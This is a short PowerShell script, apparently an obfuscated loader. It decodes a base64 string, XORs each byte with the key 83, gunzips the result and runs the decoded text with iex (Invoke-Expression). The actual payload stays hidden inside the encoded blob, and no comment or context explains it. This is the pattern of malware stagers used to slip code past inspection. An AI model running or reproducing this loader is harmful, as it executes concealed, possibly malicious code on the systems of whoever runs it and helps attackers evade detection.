$qod = "TNhbU/V1sjlRrDaZ4lmRY0NVs470W3L4auMIkgJk4vPwGN8snvLumbYxLi9UFITcfOf+fDX8iUA6CbHO/uc4+INv2BJ/tSrxUkpxEdU5r3OWC/pzjnke2tbpPUCi0gyi8X1n5G1liKBAnVSb6Gy8XZA2r97AduYsrFFh4trX1FNTUw=="
$llp = 83
$ogt = New-Object System.IO.MemoryStream
$mtk = [Convert]::FromBase64String($qod)
for($vhz=0; $vhz -lt $mtk.Length; $vhz++) {
    $ogt.WriteByte($mtk[$vhz] -bxor $llp)
}
$ogt.Position = 0
$pvd = New-Object System.IO.Compression.GZipStream($ogt, [System.IO.Compression.CompressionMode]::Decompress)
$bpb = New-Object System.IO.StreamReader($pvd)
$kmd = $bpb.ReadToEnd()
iex $kmd
